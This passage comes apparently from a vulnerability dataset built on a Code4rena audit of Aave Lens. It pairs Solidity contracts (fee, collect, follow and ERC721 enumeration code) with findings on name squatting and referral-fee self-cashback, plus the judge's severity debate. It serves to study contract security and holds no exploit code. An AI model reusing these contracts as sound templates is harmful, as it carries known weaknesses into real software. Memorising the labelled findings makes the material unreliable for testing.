governance accidentally registers a faulty module. I think for these reasons, I am more inclined to mark this as medium as it requires certain assumptions. While I understand C4 typically judges high severity issues as resulting in a loss of funds, Aave Lens is unique in that funds aren't paramount to how the protocol is intended to be used. I am open to further discussion if you disagree with me in any way @Zer0dot?\n\nZer0dot (Aave Lens) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/45#issuecomment-1118624621):\n  I wouldn't put it beyond the realm of possibility to see governance accidentally whitelist a module where this is possible. I do agree it's valid, medium sounds fine to me.\n\n0xleastwood (judge) decreased severity to Medium and commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/45#issuecomment-1119019232):\n  Sweet, I'll downgrade this to medium considering we are both in agreement.\n\n\n\n*\n\n# Low Risk and Non-Critical Issues\n\nFor this contest, 14 reports were submitted by wardens detailing low risk and non-critical issues. The report highlighted below(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/66) by WatchPug received the top score from the judge.\n\n*The following wardens also submitted reports: Dravee(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/60), pauliax(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/82), defsec(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/73), csanuragjain(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/18), hubble(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/64), gzeon(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/80), cccz(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/15), hyh(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/87), sikorico(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/16), 0xwags(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/85), 0x0x0x(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/40), 0x1f8b(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/49), and kenta(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/54).*\n\n\n"
            }
        ]
    },
    {
        "Code": "",
        "CodeNames": [
            ""
        ],
        "VulnerabilityDesc": [
            {
                "Name": "M-04",
                "Location": [],
                "Type": " Name squatting",
                "Description": "\nLensHub.sol#L142(https://github.com/code-423n4/2022-02-aave-lens/blob/aaf6c116345f3647e11a35010f28e3b90e7b4862/contracts/core/LensHub.sol#L142)<br\n\nCreating profiles through LensHub/PublishingLogic.createProfile does not cost anything and will therefore result in \"name squatting\".<br\nA whitelisted profile creator will create many handles that are in demand, even if they don't need them, just to flip them for a profit later.<br\nThis ruins the experience for many high-profile users that can't get their desired handle.\n\n",
                "Repair": "\nConsider auctioning off handles to the highest bidder or at least taking a fee such that the cost of name squatting is not zero.\n\ndonosonaumczuk (Aave Lens) disputed(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/27)\n\noneski (Aave Lens) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/27#issuecomment-1042215123):\n  Declined. This is by design. Governance can allow contracts/addresses to mint. If governance allows a malicious actor that is the fault of governance. Governance can also allow contracts that implement auction or other functionality as well to manage the profile minting system.\n \n The protocol should take no opinion on this by default.\n\n0xleastwood (judge) decreased severity to Medium and commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/27#issuecomment-1117274439):\n  I will mark this as medium risk for the same reasons outlined in M-03 (Issue #26)(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26#issuecomment-1125814379).\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: AGPL-3.0-only\n\npragma solidity 0.8.10;\n\nimport {ICollectModule} from '../../../interfaces/ICollectModule.sol';\nimport {ModuleBase} from '../ModuleBase.sol';\nimport {FollowValidationModuleBase} from '../FollowValidationModuleBase.sol';\n\n/**\n * @title EmptyCollectModule\n * @author Lens Protocol\n *\n * @notice This is a simple Lens CollectModule implementation, inheriting from the ICollectModule interface.\n *\n * This module works by allowing all collects by followers.\n */\ncontract EmptyCollectModule is ICollectModule, FollowValidationModuleBase {\n    constructor(address hub) ModuleBase(hub) {}\n\n    /**\n     * @dev There is nothing needed at initialization.\n     */\n    function initializePublicationCollectModule(\n        uint256 profileId,\n        uint256 pubId,\n        bytes calldata data\n    ) external pure override returns (bytes memory) {\n        return new bytes(0);\n    }\n\n    /**\n     * @dev Processes a collect by:\n     *  1. Ensuring the collector is a follower\n     */\n    function processCollect(\n        uint256 referrerProfileId,\n        address collector,\n        uint256 profileId,\n        uint256 pubId,\n        bytes calldata data\n    ) external view override {\n        _checkFollowValidity(profileId, collector);\n    }\n}\n\n\n",
        "CodeNames": [
            "EmptyCollectModule.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "M-05",
                "Location": [
                    "referrerProfileId",
                    "processCollect"
                ],
                "Type": " Cashback on referral",
                "Description": "\nFeeCollectModule.sol#L99(https://github.com/code-423n4/2022-02-aave-lens/blob/aaf6c116345f3647e11a35010f28e3b90e7b4862/contracts/core/modules/collect/FeeCollectModule.sol#L99)<br\n\nIn the fee collect modules like FeeCollectModule there is no prevention of someone submitting a second profile they own as the referrerProfileId in processCollect to receive back part of the fees paid.\n\nThe referral system is essentially broken as all rational agents will submit a second profile they control to get back part of the fees.\nOne could even create a referrer smart contract profile that anyone can submit which automatically refunds the fee received.\nA similar royalties/referral fees issue(https://github.com/code-423n4/2021-11-nested-findings/issues/30) was judged high-severity recently.\n\n",
                "Repair": "\nThere's no way to avoid this except by not allowing any profile as a referrer.<br\nWhitelist certain important infrastructure providers, like different frontends, as referrers and only allow these to be used instead of users submitting their alt profiles.\n\n\nZer0dot (Aave Lens) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20#issuecomment-1039791848):\n  Not sure if this makes sense, using your own referrer as a profile would basically be the equivalent of just having your publication collected directly without referral. In which case, what is the vulnerability?\n\ndonosonaumczuk (Aave Lens) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20#issuecomment-1074354753):\n  I think they mean the case where Alice posts something and Bob wants to collect it. So Bob instead of just collecting directly from Alice publication, he creates a secondary profile, Bob2, mirrors publication through Bob2 and now Bob collects through Bob2's mirror, basically using the referral fee as a collecting discount for himself.\n \n Even if we enforce referral profile owner to be different than collecting profile owner (aka comparing ownerOf(profileId) instead of profileId) people can just use different addresses for the purpose.\n \n I saw this before but I assumed most of people will use the frontend, which will handle this automatically. But I believe that in the long term is possible that people learn the trick and, as rational agents, use it. \n \n Awaiting for @Zer0dot thoughts on this.\n\nZer0dot (Aave Lens) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20#issuecomment-1074492445):\n  I see, thanks @donosonaumczuk, at the end of the day this is a social protocol. Just like how on legacy social media, users can spam/abuse things, it's a given here that we will never have a fully foolproof system. Plus, with the chain history being visible, tools can (and I'd like to see them) be built to filter out nasty behavior. @oneski want to weigh in?\n\ndonosonaumczuk (Aave Lens) disputed and commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20#issuecomment-1079127042):\n  I think there is nothing more to do here.\n\n0xleastwood (judge) decreased severity to Medium and commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20#issuecomment-1117647633):\n  I think its naive to think that this will be properly handled by the front-end and won't be abused by users at some point in time. As such, I'm inclined to treat this as a valid medium risk issue because it fits the category of value leakage by the protocol. However, I can understand that there is no easy fix to this because it is impossible to link EOAs as originating from the same person.\n\nZer0dot (Aave Lens) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20#issuecomment-1125239400):\n  Yeah I think that's fair, since we're dealing with a social protocol there's a degree of social \"etiquette\" expected from users. Since this does not harm the protocol or the original publication creator, I don't see it as a significant flaw. However, it does of course harm curators. I tend to disagree on the point about frontends @0xleastwood though, it seems to me that if this were to be a problem, it would be fairly straightforward to point fingers at those abusing the system.\n\n0xleastwood (judge) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20#issuecomment-1125801258):\n  While I understand an attacker would need to call functions directly to set this up, I'm not fully onboard with the idea that we could punish users who abuse the system in such a way. As per the judging guidelines, any issue that leaks value from the protocol is medium risk.\n \n \n 2 \u2014 Med (M): vulns have a risk of 2 and are considered \u201cMedium\u201d severity when assets are not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n \n \n I think its perfectly fine if this issue is acknowledged and you guys have decided to handle it through front-end design. However, it does not take away from the fact that it is still somewhat of an exploit.\n\nZer0dot (Aave Lens) acknowledged and commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20#issuecomment-1126093212):\n  Fair enough! We can roll with medium.\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: AGPL-3.0-only\n\npragma solidity 0.8.10;\n\nimport {Errors} from '../../libraries/Errors.sol';\nimport {Events} from '../../libraries/Events.sol';\nimport {IModuleGlobals} from '../../interfaces/IModuleGlobals.sol';\n\n/**\n * @title FeeModuleBase\n * @author Lens Protocol\n *\n * @notice This is an abstract contract to be inherited from by modules that require basic fee functionality. It\n * contains getters for module globals parameters as well as a validation function to check expected data.\n */\nabstract contract FeeModuleBase {\n    uint16 internal constant BPS_MAX = 10000;\n\n    address public immutable MODULE_GLOBALS;\n\n    constructor(address moduleGlobals) {\n        if (moduleGlobals == address(0)) revert Errors.InitParamsInvalid();\n        MODULE_GLOBALS = moduleGlobals;\n        emit Events.FeeModuleBaseConstructed(moduleGlobals, block.timestamp);\n    }\n\n    function _currencyWhitelisted(address currency) internal view returns (bool) {\n        return IModuleGlobals(MODULE_GLOBALS).isCurrencyWhitelisted(currency);\n    }\n\n    function _treasuryData() internal view returns (address, uint16) {\n        return IModuleGlobals(MODULE_GLOBALS).getTreasuryData();\n    }\n\n    function _validateDataIsExpected(\n        bytes calldata data,\n        address currency,\n        uint256 amount\n    ) internal pure {\n        (address decodedCurrency, uint256 decodedAmount) = abi.decode(data, (address, uint256));\n        if (decodedAmount != amount || decodedCurrency != currency)\n            revert Errors.ModuleDataMismatch();\n    }\n}\n\n\n// SPDX-License-Identifier: AGPL-3.0-only\n\npragma solidity 0.8.10;\n\nimport {ICollectNFT} from '../interfaces/ICollectNFT.sol';\nimport {ILensHub} from '../interfaces/ILensHub.sol';\nimport {Errors} from '../libraries/Errors.sol';\nimport {Events} from '../libraries/Events.sol';\nimport {LensNFTBase} from './base/LensNFTBase.sol';\n\n/**\n * @title CollectNFT\n * @author Lens Protocol\n *\n * @notice This is the NFT contract that is minted upon collecting a given publication. It is cloned upon\n * the first collect for a given publication, and the token URI points to the original publication's contentURI.\n */\ncontract CollectNFT is ICollectNFT, LensNFTBase {\n    address public immutable HUB;\n\n    uint256 internal _profileId;\n    uint256 internal _pubId;\n    uint256 internal _tokenIdCounter;\n\n    bool private _initialized;\n\n    // We create the CollectNFT with the pre-computed HUB address before deploying the hub proxy in order\n    // to initialize the hub proxy at construction.\n    constructor(address hub) {\n        HUB = hub;\n    }\n\n    /// @inheritdoc ICollectNFT\n    function initialize(\n        uint256 profileId,\n        uint256 pubId,\n        string calldata name,\n        string calldata symbol\n    ) external override {\n        if (_initialized) revert Errors.Initialized();\n        _initialized = true;\n        _profileId = profileId;\n        _pubId = pubId;\n        super._initialize(name, symbol);\n        emit Events.CollectNFTInitialized(profileId, pubId, block.timestamp);\n    }\n\n    /// @inheritdoc ICollectNFT\n    function mint(address to) external override {\n        if (msg.sender != HUB) revert Errors.NotHub();\n        uint256 tokenId = ++_tokenIdCounter;\n        _mint(to, tokenId);\n    }\n\n    /// @inheritdoc ICollectNFT\n    function getSourcePublicationPointer() external view override returns (uint256, uint256) {\n        return (_profileId, _pubId);\n    }\n\n    function tokenURI(uint256 tokenId) public view override returns (string memory) {\n        if (!_exists(tokenId)) revert Errors.TokenDoesNotExist();\n        return ILensHub(HUB).getContentURI(_profileId, _pubId);\n    }\n\n    /**\n     * @dev Upon transfers, we emit the transfer event in the hub.\n     */\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal override {\n        super._beforeTokenTransfer(from, to, tokenId);\n        ILensHub(HUB).emitCollectNFTTransferEvent(_profileId, _pubId, tokenId, from, to);\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport './ERC721Time.sol';\nimport '@openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol';\n\n/**\n * @dev This implements an optional extension of {ERC721} defined in the EIP that adds\n * enumerability of all the token ids in the contract as well as all token ids owned by each\n * account.\n *\n * NOTE: Modified from Openzeppelin to inherit from a modified ERC721 contract.\n */\nabstract contract ERC721Enumerable is ERC721Time, IERC721Enumerable {\n    // Mapping from owner to list of owned token IDs\n    mapping(address => mapping(uint256 => uint256)) private _ownedTokens;\n\n    // Mapping from token ID to index of the owner tokens list\n    mapping(uint256 => uint256) private _ownedTokensIndex;\n\n    // Array with all token ids, used for enumeration\n    uint256[] private _allTokens;\n\n    // Mapping from token id to position in the allTokens array\n    mapping(uint256 => uint256) private _allTokensIndex;\n\n    /**\n     * @dev See {IERC165-supportsInterface}.\n     */\n    function supportsInterface(bytes4 interfaceId)\n        public\n        view\n        virtual\n        override(IERC165, ERC721Time)\n        returns (bool)\n    {\n        return\n            interfaceId == type(IERC721Enumerable).interfaceId ||\n            super.supportsInterface(interfaceId);\n    }\n\n    /**\n     * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.\n     */\n    function tokenOfOwnerByIndex(address owner, uint256 index)\n        public\n        view\n        virtual\n        override\n        returns (uint256)\n    {\n        require(index < ERC721Time.balanceOf(owner), 'ERC721Enumerable: owner index out of bounds');\n        return _ownedTokens[owner][index];\n    }\n\n    /**\n     * @dev See {IERC721Enumerable-totalSupply}.\n     */\n    function totalSupply() public view virtual override returns (uint256) {\n        return _allTokens.length;\n    }\n\n    /**\n     * @dev See {IERC721Enumerable-tokenByIndex}.\n     */\n    function tokenByIndex(uint256 index) public view virtual override returns (uint256) {\n        require(\n            index < ERC721Enumerable.totalSupply(),\n            'ERC721Enumerable: global index out of bounds'\n        );\n        return _allTokens[index];\n    }\n\n    /**\n     * @dev Hook that is called before any token transfer. This includes minting\n     * and burning.\n     *\n     * Calling conditions:\n     *\n     * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be\n     * transferred to `to`.\n     * - When `from` is zero, `tokenId` will be minted for `to`.\n     * - When `to` is zero, ``from``'s `tokenId` will be burned.\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal virtual override {\n        super._beforeTokenTransfer(from, to, tokenId);\n\n        if (from == address(0)) {\n            _addTokenToAllTokensEnumeration(tokenId);\n        } else if (from != to) {\n            _removeTokenFromOwnerEnumeration(from, tokenId);\n        }\n        if (to == address(0)) {\n            _removeTokenFromAllTokensEnumeration(tokenId);\n        } else if (to != from) {\n            _addTokenToOwnerEnumeration(to, tokenId);\n        }\n    }\n\n    /**\n     * @dev Private function to add a token to this extension's ownership-tracking data structures.\n     * @param to address representing the new owner of the given token ID\n     * @param tokenId uint256 ID of the token to be added to the tokens list of the given address\n     */\n    function _addTokenToOwnerEnumeration(address to, uint256 tokenId) private {\n        uint256 length = ERC721Time.balanceOf(to);\n        _ownedTokens[to][length] = tokenId;\n        _ownedTokensIndex[tokenId] = length;\n    }\n\n    /**\n     * @dev Private function to add a token to this extension's token tracking data structures.\n     * @param tokenId uint256 ID of the token to be added to the tokens list\n     */\n    function _addTokenToAllTokensEnumeration(uint256 tokenId) private {\n        _allTokensIndex[tokenId] = _allTokens.length;\n        _allTokens.push(tokenId);\n    }\n\n    /**\n     * @dev Private function to remove a token from this extension's ownership-tracking data structures. Note that\n     * while the token is not assigned a new owner, the `_ownedTokensIndex` mapping is _not_ updated: this allows for\n     * gas optimizations e.g. when performing a transfer operation (avoiding double writes).\n     * This has O(1) time complexity, but alters the order of the _ownedTokens array.\n     * @param from address representing the previous owner of the given token ID\n     * @param tokenId uint256 ID of the token to be removed from the tokens list of the given address\n     */\n    function _removeTokenFromOwnerEnumeration(address from, uint256 tokenId) private {\n        // To prevent a gap in from's tokens array, we store the last token in the index of the token to delete, and\n        // then delete the last slot (swap and pop).\n\n        uint256 lastTokenIndex = ERC721Time.balanceOf(from) - 1;\n        uint256 tokenIndex = _ownedTokensIndex[tokenId];\n\n        // When the token to delete is the last token, the swap operation is unnecessary\n        if (tokenIndex != lastTokenIndex) {\n            uint256 lastTokenId = _ownedTokens[from][lastTokenIndex];\n\n            _ownedTokens[from][tokenIndex] = lastTokenId; // Move the last token to the slot of the to-delete token\n            _ownedTokensIndex[lastTokenId] = tokenIndex; // Update the moved token's index\n        }\n\n        // This also deletes the contents at the last position of the array\n        delete _ownedTokensIndex[tokenId];\n        delete _ownedTokens[from][lastTokenIndex];\n    }\n\n    /**\n     * @dev Private function to remove a token from this extension's token tracking data structures.\n     * This has O(1) time complexity, but alters the order of the _allTokens array.\n     * @param tokenId uint256 ID of the token to be removed from the tokens list\n     */\n    function _removeTokenFromAllTokensEnumeration(uint256 tokenId) private {\n        // To prevent a gap in the tokens array, we store the last token in the index of the token to delete, and\n        // then delete the last slot (swap and pop).\n\n        uint256 lastTokenIndex = _allTokens.length - 1;\n        uint256 tokenIndex = _allTokensIndex[tokenId];\n\n        // When the token to delete is the last token, the swap operation is unnecessary. However, since this occurs so\n        // rarely (when the last minted token is burnt) that we still do the swap here to avoid the gas cost of adding\n        // an 'if' statement (like in _removeTokenFromOwnerEnumeration)\n        uint256 lastTokenId = _allTokens[lastTokenIndex];\n\n        _allTokens[tokenIndex] = lastTokenId; // Move the last token to the slot of the to-delete token\n        _allTokensIndex[lastTokenId] = tokenIndex; // Update the moved token's index\n\n        // This also deletes the contents at the last position of the array\n        delete _allTokensIndex[tokenId];\n        _allTokens.pop();\n    }\n}\n\n\n// SPDX-License-Identifier: AGPL-3.0-only\n\npragma solidity 0.8.10;\n\nimport {IFollowNFT} from '../interfaces/IFollowNFT.sol';\nimport {IFollowModule} from '../interfaces/IFollowModule.sol';\nimport {ILensHub} from '../interfaces/ILensHub.sol';\nimport {Errors} from '../libraries/Errors.sol';\nimport {Events} from '../libraries/Events.sol';\nimport {DataTypes} from '../libraries/DataTypes.sol';\nimport {LensNFTBase} from './base/LensNFTBase.sol';\nimport {IERC721Metadata} from '@openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol';\n\n/**\n * @title FollowNFT\n * @author Lens Protocol\n *\n * @notice This contract is the NFT that is minted upon following a given profile. It is cloned upon first follow for a\n * given profile, and includes built-in governance power and delegation mechanisms.\n *\n * NOTE: This contract assumes total NFT supply for this follow NFT will never exceed 2^128 - 1\n */\ncontract FollowNFT is LensNFTBase, IFollowNFT {\n    struct Snapshot {\n        uint128 blockNumber;\n        uint128 value;\n    }\n\n    address public immutable HUB;\n\n    bytes32 internal constant DELEGATE_BY_SIG_TYPEHASH =\n        0xb8f190a57772800093f4e2b186099eb4f1df0ed7f5e2791e89a4a07678e0aeff;\n    // keccak256(\n    // 'DelegateBySig(address delegator,address delegatee,uint256 nonce,uint256 deadline)'\n    // );\n\n    mapping(address => mapping(uint256 => Snapshot)) internal _snapshots;\n    mapping(address => address) internal _delegates;\n    mapping(address => uint256) internal _snapshotCount;\n    mapping(uint256 => Snapshot) internal _delSupplySnapshots;\n    uint256 internal _delSupplySnapshotCount;\n    uint256 internal _profileId;\n    uint256 internal _tokenIdCounter;\n\n    bool private _initialized;\n\n    // We create the FollowNFT with the pre-computed HUB address before deploying the hub.\n    constructor(address hub) {\n        HUB = hub;\n    }\n\n    /// @inheritdoc IFollowNFT\n    function initialize(\n        uint256 profileId,\n        string calldata name,\n        string calldata symbol\n    ) external override {\n        if (_initialized) revert Errors.Initialized();\n        _initialized = true;\n        _profileId = profileId;\n        super._initialize(name, symbol);\n        emit Events.FollowNFTInitialized(profileId, block.timestamp);\n    }\n\n    /// @inheritdoc IFollowNFT\n    function mint(address to) external override {\n        if (msg.sender != HUB) revert Errors.NotHub();\n        uint256 tokenId = ++_tokenIdCounter;\n        _mint(to, tokenId);\n    }\n\n    /// @inheritdoc IFollowNFT\n    function delegate(address delegatee) external override {\n        _delegate(msg.sender, delegatee);\n    }\n\n    /// @inheritdoc IFollowNFT\n    function delegateBySig(\n        address delegator,\n        address delegatee,\n        DataTypes.EIP712Signature calldata sig\n    ) external override {\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            DELEGATE_BY_SIG_TYPEHASH,\n                            delegator,\n                            delegatee,\n                            sigNonces[delegator]++,\n                            sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n        _validateRecoveredAddress(digest, delegator, sig);\n        _delegate(delegator, delegatee);\n    }\n\n    /// @inheritdoc IFollowNFT\n    function getPowerByBlockNumber(address user, uint256 blockNumber)\n        external\n        view\n        override\n        returns (uint256)\n    {\n        if (blockNumber > block.number) revert Errors.BlockNumberInvalid();\n\n        uint256 snapshotCount = _snapshotCount[user];\n\n        if (snapshotCount == 0) {\n            return 0; // Returning zero since this means the user never delegated and has no power\n        }\n\n        uint256 lower = 0;\n        uint256 upper = snapshotCount - 1;\n\n        // First check most recent balance\n        if (_snapshots[user][upper].blockNumber <= blockNumber) {\n            return _snapshots[user][upper].value;\n        }\n\n        // Next check implicit zero balance\n        if (_snapshots[user][lower].blockNumber > blockNumber) {\n            return 0;\n        }\n\n        while (upper > lower) {\n            uint256 center = upper - (upper - lower) / 2;\n            Snapshot memory snapshot = _snapshots[user][center];\n            if (snapshot.blockNumber == blockNumber) {\n                return snapshot.value;\n            } else if (snapshot.blockNumber < blockNumber) {\n                lower = center;\n            } else {\n                upper = center - 1;\n            }\n        }\n        return _snapshots[user][lower].value;\n    }\n\n    /// @inheritdoc IFollowNFT\n    function getDelegatedSupplyByBlockNumber(uint256 blockNumber)\n        external\n        view\n        override\n        returns (uint256)\n    {\n        if (blockNumber > block.number) revert Errors.BlockNumberInvalid();\n\n        uint256 snapshotCount = _delSupplySnapshotCount;\n\n        if (snapshotCount == 0) {\n            return 0; // Returning zero since this means a delegation has never occurred\n        }\n\n        uint256 lower = 0;\n        uint256 upper = snapshotCount - 1;\n\n        // First check most recent delegated supply\n        if (_delSupplySnapshots[upper].blockNumber <= blockNumber) {\n            return _delSupplySnapshots[upper].value;\n        }\n\n        // Next check implicit zero balance\n        if (_delSupplySnapshots[lower].blockNumber > blockNumber) {\n            return 0;\n        }\n\n        while (upper > lower) {\n            uint256 center = upper - (upper - lower) / 2;\n            Snapshot memory snapshot = _delSupplySnapshots[center];\n            if (snapshot.blockNumber == blockNumber) {\n                return snapshot.value;\n            } else if (snapshot.blockNumber < blockNumber) {\n                lower = center;\n            } else {\n                upper = center - 1;\n            }\n        }\n        return _delSupplySnapshots[lower].value;\n    }\n\n    /**\n     * @dev This returns the follow NFT URI fetched from the hub.\n     */\n    function tokenURI(uint256 tokenId) public view override returns (string memory) {\n        if (!_exists(tokenId)) revert Errors.TokenDoesNotExist();\n        return ILensHub(HUB).getFollowNFTURI(_profileId);\n    }\n\n    /**\n     * @dev Upon transfers, we move the appropriate delegations, and emit the transfer event in the hub.\n     */\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal override {\n        address fromDelegatee = _delegates[from];\n        address toDelegatee =  _delegates[to];\n        address followModule = ILensHub(HUB).getFollowModule(_profileId);\n\n        _moveDelegate(fromDelegatee, toDelegatee, 1);\n\n        super._beforeTokenTransfer(from, to, tokenId);\n        ILensHub(HUB).emitFollowNFTTransferEvent(_profileId, tokenId, from, to);\n        if (followModule != address(0)) {\n            IFollowModule(followModule).followModuleTransferHook(_profileId, from, to, tokenId);\n        }\n    }\n\n    function _delegate(address delegator, address delegatee) internal {\n        uint256 delegatorBalance = balanceOf(delegator);\n        address previousDelegate = _delegates[delegator];\n        _delegates[delegator] = delegatee;\n        _moveDelegate(previousDelegate, delegatee, delegatorBalance);\n    }\n\n    function _moveDelegate(\n        address from,\n        address to,\n        uint256 amount\n    ) internal {\n        unchecked {\n            if (from != address(0)) {\n                uint256 fromSnapshotCount = _snapshotCount[from];\n\n                // Underflow is impossible since, if from != address(0), then a delegation must have occurred (at least 1 snapshot)\n                uint256 previous = _snapshots[from][fromSnapshotCount - 1].value;\n                uint128 newValue = uint128(previous - amount);\n\n                _writeSnapshot(from, newValue, fromSnapshotCount);\n                emit Events.FollowNFTDelegatedPowerChanged(from, newValue, block.timestamp);\n            }\n\n            if (to != address(0)) {\n                // if from == address(0) then this is an initial delegation (add amount to supply)\n                if (from == address(0)) {\n                    // It is expected behavior that the `previousDelSupply` underflows upon the first delegation,\n                    // returning the expected value of zero\n                    uint256 delSupplySnapshotCount = _delSupplySnapshotCount;\n                    uint128 previousDelSupply = _delSupplySnapshots[delSupplySnapshotCount - 1]\n                        .value;\n                    uint128 newDelSupply = uint128(previousDelSupply + amount);\n                    _writeSupplySnapshot(newDelSupply, delSupplySnapshotCount);\n                }\n\n                // It is expected behavior that `previous` underflows upon the first delegation to an address,\n                // returning the expected value of zero\n                uint256 toSnapshotCount = _snapshotCount[to];\n                uint128 previous = _snapshots[to][toSnapshotCount - 1].value;\n                uint128 newValue = uint128(previous + amount);\n                _writeSnapshot(to, newValue, toSnapshotCount);\n                emit Events.FollowNFTDelegatedPowerChanged(to, newValue, block.timestamp);\n            } else {\n                // If from != address(0) then this is removing a delegation, otherwise we're dealing with a\n                // non-delegated burn of tokens and don't need to take any action\n                if (from != address(0)) {\n                    // Upon removing delegation (from != address(0) && to == address(0)), supply calculations cannot\n                    // underflow because if from != address(0), then a delegation must have previously occurred, so\n                    // the snapshot count must be >= 1 and the previous delegated supply must be >= amount\n                    uint256 delSupplySnapshotCount = _delSupplySnapshotCount;\n                    uint128 previousDelSupply = _delSupplySnapshots[delSupplySnapshotCount - 1]\n                        .value;\n                    uint128 newDelSupply = uint128(previousDelSupply - amount);\n                    _writeSupplySnapshot(newDelSupply, delSupplySnapshotCount);\n                }\n            }\n        }\n    }\n\n    function _writeSnapshot(\n        address owner,\n        uint128 newValue,\n        uint256 ownerSnapshotCount\n    ) internal {\n        unchecked {\n            uint128 currentBlock = uint128(block.number);\n            mapping(uint256 => Snapshot) storage ownerSnapshots = _snapshots[owner];\n\n            // Doing multiple operations in the same block\n            if (\n                ownerSnapshotCount != 0 &&\n                ownerSnapshots[ownerSnapshotCount - 1].blockNumber == currentBlock\n            ) {\n                ownerSnapshots[ownerSnapshotCount - 1].value = newValue;\n            } else {\n                ownerSnapshots[ownerSnapshotCount] = Snapshot(currentBlock, newValue);\n                _snapshotCount[owner] = ownerSnapshotCount + 1;\n            }\n        }\n    }\n\n    function _writeSupplySnapshot(uint128 newValue, uint256 supplySnapshotCount) internal {\n        unchecked {\n            uint128 currentBlock = uint128(block.number);\n\n            // Doing multiple operations in the same block\n            if (\n                supplySnapshotCount != 0 &&\n                _delSupplySnapshots[supplySnapshotCount - 1].blockNumber == currentBlock\n            ) {\n                _delSupplySnapshots[supplySnapshotCount - 1].value = newValue;\n            } else {\n                _delSupplySnapshots[supplySnapshotCount] = Snapshot(currentBlock, newValue);\n                _delSupplySnapshotCount = supplySnapshotCount + 1;\n            }\n        }\n    }\n}\n\n\n// SPDX-License-Identifier: AGPL-3.0-only\n\npragma solidity 0.8.10;\n\nimport {IFollowModule} from '../../../interfaces/IFollowModule.sol';\nimport {Errors} from '../../../libraries/Errors.sol';\nimport {Events} from '../../../libraries/Events.sol';\nimport {ModuleBase} from '../ModuleBase.sol';\nimport {FollowValidatorFollowModuleBase} from './FollowValidatorFollowModuleBase.sol';\nimport {IERC721} from '@openzeppelin/contracts/token/ERC721/IERC721.sol';\n\n/**\n * @title ApprovalFollowModule\n * @author Lens Protocol\n *\n * @notice This follow module only allows addresses that are approved for a profile by the profile owner to follow.\n */\ncontract ApprovalFollowModule is IFollowModule, FollowValidatorFollowModuleBase {\n    // We use a triple nested mapping so that, on profile transfer, the previous approved address list is invalid;\n    mapping(address => mapping(uint256 => mapping(address => bool)))\n        internal _approvedByProfileByOwner;\n\n    constructor(address hub) ModuleBase(hub) {}\n\n    /**\n     * @notice A custom function that allows profile owners to customize approved addresses.\n     *\n     * @param profileId The profile ID to approve/disapprove follower addresses for.\n     * @param addresses The addresses to approve/disapprove for following the profile.\n     * @param toApprove Whether to approve or disapprove the addresses for following the profile.\n     */\n    function approve(\n        uint256 profileId,\n        address[] calldata addresses,\n        bool[] calldata toApprove\n    ) external {\n        if (addresses.length != toApprove.length) revert Errors.InitParamsInvalid();\n        address owner = IERC721(HUB).ownerOf(profileId);\n        if (msg.sender != owner) revert Errors.NotProfileOwner();\n\n        for (uint256 i = 0; i < addresses.length; ++i) {\n            _approvedByProfileByOwner[owner][profileId][addresses[i]] = toApprove[i];\n        }\n\n        emit Events.FollowsApproved(owner, profileId, addresses, toApprove, block.timestamp);\n    }\n\n    /**\n     * @notice This follow module works on custom profile owner approvals.\n     *\n     * @param data The arbitrary data parameter, decoded into:\n     *      address[] addresses: The array of addresses to approve initially.\n     *\n     * @return An abi encoded bytes parameter, which is the same as the passed data parameter.\n     */\n    function initializeFollowModule(uint256 profileId, bytes calldata data)\n        external\n        override\n        onlyHub\n        returns (bytes memory)\n    {\n        address owner = IERC721(HUB).ownerOf(profileId);\n\n        if (data.length > 0) {\n            address[] memory addresses = abi.decode(data, (address[]));\n            for (uint256 i = 0; i < addresses.length; ++i) {\n                _approvedByProfileByOwner[owner][profileId][addresses[i]] = true;\n            }\n        }\n        return data;\n    }\n\n    /**\n     * @dev Processes 